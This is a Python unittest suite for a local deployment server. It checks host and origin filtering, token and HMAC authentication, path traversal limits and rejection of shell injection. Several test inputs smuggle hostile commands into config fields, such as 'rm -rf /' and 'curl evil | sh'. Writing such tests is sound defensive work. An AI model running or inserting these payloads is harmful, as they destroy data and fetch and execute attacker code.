import hmac
import hashlib
import http.client
import json
import os
import shlex
import sys
import threading
import time
import unittest
from pathlib import Path

# Add backend directory to sys.path
sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "features" / "deployment" / "backend"))

import config
import commands
import server
import jobs


class TestSecurityGuards(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        # Set a fixed test token
        cls.test_token = "test_secret_token_1234567890abcdef"
        os.environ["DEPLOYMENT_AUTH_TOKEN"] = cls.test_token
        server._SERVER_AUTH_TOKEN = cls.test_token

        # Start background HTTP server on dynamic port
        cls.port = 18999
        cls.httpd = http.server.ThreadingHTTPServer(("127.0.0.1", cls.port), server.DeploymentHandler)
        cls.server_thread = threading.Thread(target=cls.httpd.serve_forever, daemon=True)
        cls.server_thread.start()
        time.sleep(0.1)

    @classmethod
    def tearDownClass(cls):
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def test_dns_rebinding_rejected(self):
        """DNS rebinding attack with Host: evil.com must be rejected with 403."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("GET", "/api/deployment/apps", headers={
            "Host": "evil.com:18112",
            "X-API-Token": self.test_token
        })
        resp = conn.getresponse()
        self.assertEqual(resp.status, 403)
        conn.close()

    def test_bad_origin_rejected(self):
        """Cross-origin request from malicious origin must be rejected."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("GET", "/api/deployment/apps", headers={
            "Host": f"localhost:{self.port}",
            "Origin": "http://evil.com",
            "X-API-Token": self.test_token
        })
        resp = conn.getresponse()
        self.assertEqual(resp.status, 403)
        conn.close()

    def test_origin_0000_not_allowed(self):
        """0.0.0.0 in Origin header must be rejected."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("GET", "/api/deployment/apps", headers={
            "Host": f"localhost:{self.port}",
            "Origin": "http://0.0.0.0:18112",
            "X-API-Token": self.test_token
        })
        resp = conn.getresponse()
        self.assertEqual(resp.status, 403)
        conn.close()

    def test_get_api_requires_auth(self):
        """GET /api/* endpoints must require X-API-Token header."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("GET", "/api/deployment/apps", headers={
            "Host": f"localhost:{self.port}"
        })
        resp = conn.getresponse()
        self.assertEqual(resp.status, 401)
        data = json.loads(resp.read().decode())
        self.assertFalse(data["success"])
        self.assertIn("Unauthorized", data["error"])
        conn.close()

    def test_token_in_url_rejected(self):
        """Token in URL query param ?token= must NOT be accepted for auth."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("GET", f"/api/deployment/apps?token={self.test_token}", headers={
            "Host": f"localhost:{self.port}"
        })
        resp = conn.getresponse()
        self.assertEqual(resp.status, 401)
        conn.close()

    def test_get_api_with_valid_token_succeeds(self):
        """GET /api/* with valid X-API-Token succeeds."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("GET", "/api/deployment/apps", headers={
            "Host": f"localhost:{self.port}",
            "X-API-Token": self.test_token
        })
        resp = conn.getresponse()
        self.assertEqual(resp.status, 200)
        data = json.loads(resp.read().decode())
        self.assertTrue(data.get("success", False))
        conn.close()

    def test_command_injection_quoted(self):
        """_resolve_command wraps interpolated values in shlex.quote()."""
        deploy_cfg = {
            "apps": {
                "demo": {
                    "bundle_id_prod": "com.test; rm -rf /",
                    "android_package_prod": "com.pkg && touch /tmp/pwn",
                }
            }
        }
        res = commands._resolve_command("echo {bundle_id} {android_package}", "demo", "prod", deploy_cfg)
        self.assertIn(shlex.quote("com.test; rm -rf /"), res)
        self.assertIn(shlex.quote("com.pkg && touch /tmp/pwn"), res)

    def test_save_deploy_config_rejects_injection(self):
        """save_deploy_config rejects values containing shell metacharacters."""
        bad_config = {
            "apps": {
                "demo": {
                    "bundle_id_prod": "com.test; rm -rf /",
                }
            }
        }
        res = config.save_deploy_config(bad_config)
        self.assertFalse(res["success"])
        self.assertIn("Invalid value", res["error"])

        bad_flavor_config = {
            "apps": {
                "demo": {
                    "flavors": ["dev", "prod; echo pwned"],
                }
            }
        }
        res2 = config.save_deploy_config(bad_flavor_config)
        self.assertFalse(res2["success"])
        self.assertIn("Invalid flavor", res2["error"])

    def test_webhook_secret_required(self):
        """Webhook endpoint must return 503 when WEBHOOK_SECRET is not configured."""
        old_secret = os.environ.pop("WEBHOOK_SECRET", None)
        try:
            conn = http.client.HTTPConnection("127.0.0.1", self.port)
            conn.request("POST", "/api/deployment/webhook", body=b"{}", headers={
                "Host": f"localhost:{self.port}",
                "Content-Type": "application/json"
            })
            resp = conn.getresponse()
            self.assertEqual(resp.status, 503)
            data = json.loads(resp.read().decode())
            self.assertIn("WEBHOOK_SECRET", data["error"])
            conn.close()
        finally:
            if old_secret is not None:
                os.environ["WEBHOOK_SECRET"] = old_secret

    def test_webhook_hmac_authentication(self):
        """Webhook endpoint validates HMAC SHA256 signature when secret is set."""
        secret = "super_webhook_secret_key"
        os.environ["WEBHOOK_SECRET"] = secret
        try:
            body = json.dumps({"app": "invalid_test_app"}).encode("utf-8")

            # 1. Missing signature
            conn = http.client.HTTPConnection("127.0.0.1", self.port)
            conn.request("POST", "/api/deployment/webhook", body=body, headers={
                "Host": f"localhost:{self.port}",
                "Content-Type": "application/json"
            })
            resp = conn.getresponse()
            self.assertEqual(resp.status, 401)
            conn.close()

            # 2. Invalid HMAC signature
            conn = http.client.HTTPConnection("127.0.0.1", self.port)
            conn.request("POST", "/api/deployment/webhook", body=body, headers={
                "Host": f"localhost:{self.port}",
                "Content-Type": "application/json",
                "X-Hub-Signature-256": "sha256=invalid_hex_signature"
            })
            resp = conn.getresponse()
            self.assertEqual(resp.status, 401)
            conn.close()

            # 3. Valid HMAC signature
            sig = hmac.new(secret.encode("utf-8"), body, hashlib.sha256).hexdigest()
            conn = http.client.HTTPConnection("127.0.0.1", self.port)
            conn.request("POST", "/api/deployment/webhook", body=body, headers={
                "Host": f"localhost:{self.port}",
                "Content-Type": "application/json",
                "X-Hub-Signature-256": f"sha256={sig}"
            })
            resp = conn.getresponse()
            # Authentication succeeds
            self.assertEqual(resp.status, 200)
            conn.close()

        finally:
            os.environ.pop("WEBHOOK_SECRET", None)

    def test_workspace_switch_rejects_unauthorized_paths(self):
        """set_active_workspace must reject unauthorized directories like '/'."""
        res = config.set_active_workspace("/")
        self.assertFalse(res["success"])
        self.assertIn("not in the allowed workspaces list", res["error"])

    def test_workspace_root_getter(self):
        """get_workspace_root returns current workspace Path."""
        root = config.get_workspace_root()
        self.assertIsInstance(root, Path)
        self.assertTrue(root.exists())

    def test_execute_command_rejects_malicious_env(self):
        """execute_command must reject env with shell injection metacharacters."""
        res = jobs.execute_command(
            app="test_app",
            command="echo building any",
            env="dev; curl evil|sh",
        )
        self.assertFalse(res["success"])
        self.assertIn("Invalid env", res["error"])

    def test_execute_command_rejects_malicious_app_id(self):
        """execute_command must reject app IDs with shell injection metacharacters."""
        res = jobs.execute_command(
            app="test_app; rm -rf /",
            command="echo building",
        )
        self.assertFalse(res["success"])
        self.assertIn("Invalid app ID", res["error"])

    def test_execute_command_rejects_malicious_flavor(self):
        """execute_command must reject flavor parameter with shell injection metacharacters."""
        res = jobs.execute_command(
            app="test_app",
            command="echo building",
            flavor="dev && id",
        )
        self.assertFalse(res["success"])
        self.assertIn("Invalid flavor parameter", res["error"])

    def test_save_deploy_config_rejects_plain_keys_injection(self):
        """save_deploy_config must reject plain bundle_id and android_package injection."""
        bad_config_plain_bundle = {
            "apps": {
                "demo": {
                    "bundle_id": "x; curl evil | sh",
                }
            }
        }
        res = config.save_deploy_config(bad_config_plain_bundle)
        self.assertFalse(res["success"])
        self.assertIn("Invalid value for 'bundle_id'", res["error"])

        bad_config_plain_pkg = {
            "apps": {
                "demo": {
                    "android_package": "com.evil && touch /tmp/pwn",
                }
            }
        }
        res2 = config.save_deploy_config(bad_config_plain_pkg)
        self.assertFalse(res2["success"])
        self.assertIn("Invalid value for 'android_package'", res2["error"])

    def test_add_app_path_traversal_restricted(self):
        """add_app must reject paths outside the allowed workspace roots."""
        res = config.add_app({"id": "evil_app", "path": "/etc"})
        self.assertFalse(res["success"])
        self.assertIn("Path traversal restriction", res["error"])

    def test_auth_token_stored_in_user_config_dir(self):
        """Auth token file must be located in ~/.config/dev-deployment/auth_token.txt."""
        token_file = server._get_auth_token_file()
        expected_dir = Path.home() / ".config" / "dev-deployment"
        self.assertEqual(token_file.parent, expected_dir)
        self.assertEqual(token_file.name, "auth_token.txt")

    def test_payload_too_large_413(self):
        """Requests with Content-Length exceeding 1MB must be rejected with 413."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("POST", "/api/deployment/execute", headers={
            "Host": f"localhost:{self.port}",
            "X-API-Token": self.test_token,
            "Content-Type": "application/json",
            "Content-Length": str(1024 * 1024 + 100),
        })
        resp = conn.getresponse()
        self.assertEqual(resp.status, 413)
        conn.close()

    def test_content_security_policy_header(self):
        """Responses must include Content-Security-Policy header."""
        conn = http.client.HTTPConnection("127.0.0.1", self.port)
        conn.request("GET", "/", headers={
            "Host": f"localhost:{self.port}",
        })
        resp = conn.getresponse()
        csp = resp.getheader("Content-Security-Policy")
        self.assertIsNotNone(csp)
        self.assertIn("default-src 'self'", csp)
        conn.close()


if __name__ == "__main__":
    unittest.main()
